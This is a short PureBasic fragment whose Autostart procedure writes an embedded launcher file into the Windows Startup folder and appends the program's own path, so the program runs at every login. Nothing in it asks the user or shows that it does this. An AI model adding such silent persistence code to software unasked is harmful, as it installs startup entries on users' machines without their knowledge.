Procedure Autostart()
  
  a$=Space(#MAX_PATH)
  SHGetSpecialFolderPath_(#Null,a$,#CSIDL_STARTUP,0)
  a$=Trim(a$)
  
  f$=AddBackslash(a$) + dfslauncher$
  
  FilePutContents(f$, ?launchera, ?launcherb-?launchera)
  
  AppendToFile(f$,ProgramFilename())
  
EndProcedure
; IDE Options = PureBasic 5.70 LTS (Windows - x64)
; Folding = +
; EnableXP